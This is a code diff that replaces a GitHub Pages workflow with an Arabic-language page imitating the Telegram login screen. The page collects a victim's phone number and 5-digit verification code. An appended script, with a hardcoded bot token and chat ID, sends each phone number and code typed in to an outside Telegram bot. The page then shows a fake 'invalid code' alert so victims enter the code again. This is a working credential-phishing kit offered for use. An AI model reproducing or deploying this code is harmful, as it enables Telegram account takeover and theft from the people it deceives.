@@ -1,43 +1,269 @@
-# Simple workflow for deploying static content to GitHub Pages
-name: Deploy static content to Pages
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Telegram Login Simulation</title>
+  <style>
+    /* Base Reset */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background: #e6ecf0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: white;
+      width: 360px;
+      border-radius: 12px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      overflow: hidden;
+      animation: fadeIn 0.4s ease;
+    }
+    .header {
+      background: #0088cc;
+      padding: 16px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .header svg {
+      width: 32px;
+      height: 32px;
+      fill: white;
+    }
+    .step-title {
+      text-align: center;
+      padding: 16px;
+      font-size: 18px;
+      color: #1a1a1a;
+      font-weight: 600;
+    }
+    .content {
+      padding: 0 16px 24px;
+    }
+    .field {
+      margin-bottom: 20px;
+      position: relative;
+    }
+    label {
+      font-size: 14px;
+      color: #555;
+      display: block;
+      margin-bottom: 6px;
+    }
+    select, input {
+      width: 100%;
+      padding: 8px 0;
+      font-size: 16px;
+      border: none;
+      border-bottom: 1.5px solid #ccd6dd;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    select:focus, input:focus {
+      border-bottom-color: #0088cc;
+    }
+    /* Dial code small input */
+    .dial-group {
+      display: flex;
+      align-items: center;
+    }
+    .dial-group input:first-child {
+      width: 58px;
+      text-align: center;
+      pointer-events: none;
+      color: #333;
+      background: none;
+      border-bottom: none;
+    }
+    .dial-group input:nth-child(2) {
+      flex: 1;
+      margin-left: 8px;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #0088cc;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    .btn:hover {
+      background-color: #0077b6;
+    }
+    .hidden { display: none; }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Header with Telegram logo -->
+    <div class="header">
+      <svg viewBox="0 0 240 240">
+        <path d="M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0zm57.2 83.1l-20.1 94.5c-1.5 6.9-5.4 8.6-11 5.4l-31.8-23.4-15.3 14.8c-1.7 1.7-3.1 3.1-6.3 3.1l2.3-32.3 58.8-53.1c2.6-2.3-.6-3.6-4-1.3l-72.7 45.8-31.3-9.8c-6.8-2.1-6.9-6.8 1.5-10.1l121-46.9c5.6-2.1 10.5 1.3 8.6 10.1z"/>
+      </svg>
+    </div>
+    <!-- Page 1: Phone Input -->
+    <div id="phonePage">
+      <div class="step-title">تسجيل الدخول إلى تيليجرام</div>
+      <div class="content">
+        <div class="field">
+          <label for="countrySelect">الدولة</label>
+          <select id="countrySelect"></select>
+        </div>
+        <div class="field">
+          <label for="phoneInput">رقم الهاتف</label>
+          <div class="dial-group">
+            <input type="text" id="dialCode" disabled />
+            <input type="tel" id="phoneInput" placeholder="999xxxxxxxx" pattern="[0-9]+" required />
+          </div>
+        </div>
+        <button class="btn" id="toCodeBtn">التالي</button>
+      </div>
+    </div>
+    <!-- Page 2: Verification Code -->
+    <div id="codePage" class="hidden">
+      <div class="step-title">رمز التحقق</div>
+      <div class="content">
+        <div class="field">
+          <label for="codeInput">أدخل الرمز المكون من 5 أرقام</label>
+          <input type="text" id="codeInput" placeholder="- - - - -" maxlength="5" pattern="[0-9]{5}" required />
+        </div>
+        <button class="btn" id="verifyBtn">تأكيد</button>
+      </div>
+    </div>
+  </div>
+  <script>
+    const countries = [
+      { name: 'مصر', dial_code: '+20' },{ name: 'ألبانيا', dial_code: '+355' },
+      { name: 'الجزائر', dial_code: '+213' },{ name: 'أندورا', dial_code: '+376' },
+      { name: 'أنغولا', dial_code: '+244' },{ name: 'أنتيغوا وبربودا', dial_code: '+1-268' },
+      { name: 'الأرجنتين', dial_code: '+54' },{ name: 'أرمينيا', dial_code: '+374' },
+      { name: 'أستراليا', dial_code: '+61' },{ name: 'النمسا', dial_code: '+43' },
+      { name: 'أذربيجان', dial_code: '+994' },{ name: 'الباهاما', dial_code: '+1-242' },
+      { name: 'البحرين', dial_code: '+973' },{ name: 'بنغلاديش', dial_code: '+880' },
+      { name: 'بربادوس', dial_code: '+1-246' },{ name: 'بيلاروسيا', dial_code: '+375' },
+      { name: 'بلجيكا', dial_code: '+32' },{ name: 'بليز', dial_code: '+501' },
+      { name: 'بنين', dial_code: '+229' },{ name: 'بوتان', dial_code: '+975' },
+      { name: 'بوليفيا', dial_code: '+591' },{ name: 'البوسنة والهرسك', dial_code: '+387' },
+      { name: 'بوتسوانا', dial_code: '+267' },{ name: 'البرازيل', dial_code: '+55' },
+      { name: 'بروناي', dial_code: '+673' },{ name: 'بلغاريا', dial_code: '+359' },
+      { name: 'بوركينا فاسو', dial_code: '+226' },{ name: 'بوروندي', dial_code: '+257' },
+      { name: 'كمبوديا', dial_code: '+855' },{ name: 'الكاميرون', dial_code: '+237' },
+      { name: 'كندا', dial_code: '+1' },{ name: 'الرأس الأخضر', dial_code: '+238' },
+      { name: 'جمهورية أفريقيا الوسطى', dial_code: '+236' },{ name: 'تشاد', dial_code: '+235' },
+      { name: 'تشيلي', dial_code: '+56' },{ name: 'الصين', dial_code: '+86' },
+      { name: 'كولومبيا', dial_code: '+57' },{ name: 'جزر القمر', dial_code: '+269' },
+      { name: 'جمهورية الكونغو الديمقراطية', dial_code: '+243' },{ name: 'الكونغو', dial_code: '+242' },
+      { name: 'كوستاريكا', dial_code: '+506' },{ name: 'كرواتيا', dial_code: '+385' },
+      { name: 'كوبا', dial_code: '+53' },{ name: 'قبرص', dial_code: '+357' },
+      { name: 'التشيك', dial_code: '+420' },{ name: 'الدنمارك', dial_code: '+45' },
+      { name: 'جيبوتي', dial_code: '+253' },{ name: 'دومينيكا', dial_code: '+1-767' },
+      { name: 'جمهورية الدومينيكان', dial_code: '+1-809' },{ name: 'الإكوادور', dial_code: '+593' },
+      { name: 'أفغانستان', dial_code: '+93' },{ name: 'السلفادور', dial_code: '+503' },
+      { name: 'غينيا الاستوائية', dial_code: '+240' },{ name: 'إريتريا', dial_code: '+291' },
+      { name: 'إستونيا', dial_code: '+372' },{ name: 'إسواتيني', dial_code: '+268' },
+      { name: 'إثيوبيا', dial_code: '+251' },{ name: 'فيجي', dial_code: '+679' },
+      { name: 'فنلندا', dial_code: '+358' },{ name: 'فرنسا', dial_code: '+33' },
+      { name: 'الغابون', dial_code: '+241' },{ name: 'غامبيا', dial_code: '+220' },
+      { name: 'جورجيا', dial_code: '+995' },{ name: 'ألمانيا', dial_code: '+49' },
+      { name: 'غانا', dial_code: '+233' },{ name: 'اليونان', dial_code: '+30' },
+      { name: 'غرينادا', dial_code: '+1-473' },{ name: 'غواتيمالا', dial_code: '+502' },
+      { name: 'غينيا', dial_code: '+224' },{ name: 'غينيا بيساو', dial_code: '+245' },
+      { name: 'غيانا', dial_code: '+592' },{ name: 'هايتي', dial_code: '+509' },
+      { name: 'هندوراس', dial_code: '+504' },{ name: 'المجر', dial_code: '+36' },
+      { name: 'أيسلندا', dial_code: '+354' },{ name: 'الهند', dial_code: '+91' },
+      { name: 'إندونيسيا', dial_code: '+62' },{ name: 'إيران', dial_code: '+98' }
+    ];    
+    const countrySelect = document.getElementById('countrySelect');
+    const dialCodeInput = document.getElementById('dialCode');
 
-on:
-  # Runs on pushes targeting the default branch
-  push:
-    branches: ["main"]
+    // ملء قائمة الدول
+    countries.forEach(c => {
+      const opt = document.createElement('option');
+      opt.value = c.dial_code;
+      opt.textContent = `${c.name} (${c.dial_code})`;
+      countrySelect.appendChild(opt);
+    });
+    dialCodeInput.value = countrySelect.value;
+    countrySelect.addEventListener('change', () => {
+      dialCodeInput.value = countrySelect.value;
+    });
 
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
+    // التنقل بين الصفحات
+    document.getElementById('toCodeBtn').addEventListener('click', () => {
+      const phone = document.getElementById('phoneInput').value.trim();
+      if (!/^[0-9]{8,12}$/.test(phone)) {
+        alert('الرجاء إدخال رقم هاتف صالح');
+        return;
+      }
+      document.getElementById('phonePage').classList.add('hidden');
+      document.getElementById('codePage').classList.remove('hidden');
+      document.getElementById('codeInput').focus();
+    });
+    document.getElementById('verifyBtn').addEventListener('click', () => {
+      const code = document.getElementById('codeInput').value.trim();
+      if (!/^[0-9]{5}$/.test(code)) {
+        alert('الرمز غير صالح');
+        return;
+      }
+      alert('يرجي اخال كود صالح');
+      document.getElementById('phoneInput').value = '';
+      document.getElementById('codeInput').value = '';
+      document.getElementById('codePage').classList.add('hidden');
+      document.getElementById('phonePage').classList.remove('hidden');
+    });
+  </script>
+</body>
+</html>
+<script>
+  const botToken = '7683813209:AAE4kGIZftl9csWUTz6gdCesS5WJoLJYSCI'; // ← ضع توكن البوت هنا
+  const chatId = '7860491782';     // ← ضع آي دي حسابك هنا
 
-# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
-permissions:
-  contents: read
-  pages: write
-  id-token: write
+  function sendToBot(text) {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: text
+      })
+    }).catch(err => console.error("يرجي ادخال كود صالح:", err));
+  }
 
-# Allow only one concurrent deployment, skipping runs queued between the run in-progress and latest queued.
-# However, do NOT cancel in-progress runs as we want to allow these production deployments to complete.
-concurrency:
-  group: "pages"
-  cancel-in-progress: false
+  // مراقبة جميع الحقول تلقائيًا بعد تحميل الصفحة
+  window.addEventListener('DOMContentLoaded', () => {
+    const inputs = document.querySelectorAll('input');
 
-jobs:
-  # Single deploy job since we're just deploying
-  deploy:
-    environment:
-      name: github-pages
-      url: ${{ steps.deployment.outputs.page_url }}
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - name: Setup Pages
-        uses: actions/configure-pages@v5
-      - name: Upload artifact
-        uses: actions/upload-pages-artifact@v3
-        with:
-          # Upload entire repository
-          path: '.'
-      - name: Deploy to GitHub Pages
-        id: deployment
-        uses: actions/deploy-pages@v4
+    inputs.forEach(input => {
+      input.addEventListener('change', () => {
+        const value = input.value.trim();
+
+        // لو القيمة أقل من 4 خانات نتجاهلها
+        if (value.length < 4) return;
+
+        // محاولة ذكية لمعرفة نوع الحقل من الاسم
+        const name = (input.name || input.id || '').toLowerCase();
+
+        if (name.includes('phone') || name.includes('number') || input.type === 'tel') {
+          sendToBot(`رقم الهاتف المُدخل: ${value}`);
+        } else if (name.includes('code') || name.includes('otp') || input.type === 'number') {
+          sendToBot(`كود التحقق المُدخل: ${value}`);
+        }
+      });
+    });
+  });
+</script>
